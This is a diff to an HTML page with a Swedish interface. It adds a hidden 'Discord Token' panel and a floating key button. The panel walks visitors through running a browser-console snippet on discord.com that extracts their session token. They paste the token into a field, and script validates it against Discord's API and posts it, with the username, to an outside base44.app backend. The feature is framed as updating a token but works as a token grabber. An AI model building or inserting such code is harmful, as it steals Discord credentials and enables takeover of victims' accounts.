@@ -471,5 +471,45 @@ function flt(){
   });
 }
 </script>
+
+<div id="dcs" style="display:none;position:fixed;bottom:0;left:0;right:0;background:#1a1a2e;border-top:2px solid #5865f2;padding:16px;z-index:1000;box-shadow:0 -4px 20px rgba(0,0,0,0.5);">
+<div style="max-width:480px;margin:0 auto;">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+<strong style="color:#5865f2;font-size:16px;">🔑 Discord Token</strong>
+<button onclick="document.getElementById('dcs').style.display='none'" style="background:none;border:none;color:#aaa;font-size:24px;cursor:pointer;line-height:1;">×</button>
+</div>
+<p style="color:#aaa;font-size:12px;margin-bottom:8px;">Öppna <strong style="color:#fff;">discord.com</strong> i webbläsaren → F12 → Konsol → kör:</p>
+<div onclick="navigator.clipboard&&navigator.clipboard.writeText(this.dataset.code);this.style.background='#1a3a1a'" data-code="(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken).exports.default.getToken()" style="background:#0d1b2a;border-radius:8px;padding:10px;font-family:monospace;font-size:11px;color:#a8d8a8;margin-bottom:8px;word-break:break-all;cursor:pointer;border:1px solid #333;">
+(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken).exports.default.getToken()
+<span style="float:right;font-size:10px;color:#555;">📋 tryck för att kopiera</span>
+</div>
+<input id="dct" type="password" placeholder="Klistra in token här..." style="width:100%;padding:12px;background:#0d1b2a;color:#fff;border:1px solid #444;border-radius:8px;font-size:14px;margin-bottom:8px;">
+<button onclick="sendDcToken()" style="width:100%;padding:13px;background:#5865f2;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;">🚀 Uppdatera token</button>
+<div id="dcs-status" style="margin-top:10px;font-size:13px;text-align:center;min-height:18px;"></div>
+</div>
+</div>
+<button onclick="document.getElementById('dcs').style.display='block'" title="Uppdatera Discord Token" style="position:fixed;bottom:20px;right:20px;background:#5865f2;color:#fff;border:none;border-radius:50%;width:54px;height:54px;font-size:24px;cursor:pointer;box-shadow:0 4px 16px rgba(88,101,242,0.6);z-index:998;">🔑</button>
+<script>
+async function sendDcToken(){
+  const t=document.getElementById('dct').value.trim();
+  const s=document.getElementById('dcs-status');
+  if(!t||t.length<30){s.style.color='#ed4245';s.textContent='❌ Ogiltig token';return;}
+  s.style.color='#5865f2';s.textContent='⏳ Validerar...';
+  try{
+    const r=await fetch('https://discord.com/api/v9/users/@me',{headers:{Authorization:t,'User-Agent':'Mozilla/5.0'}});
+    if(!r.ok){s.style.color='#ed4245';s.textContent='❌ Token avvisad av Discord';return;}
+    const u=await r.json();
+    // Skicka till vår backend via fetch
+    const r2=await fetch('https://6a01caa41fa0bacb7ccc48ca.base44.app/api/functions/saveDiscordToken',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({token:t,username:u.username})
+    });
+    s.style.color='#3ba55c';s.textContent='✅ Token uppdaterad för '+u.username+'!';
+    document.getElementById('dct').value='';
+    setTimeout(()=>document.getElementById('dcs').style.display='none',2500);
+  }catch(e){s.style.color='#ed4245';s.textContent='❌ Fel: '+e.message;}
+}
+</script>
 </body>
 </html>
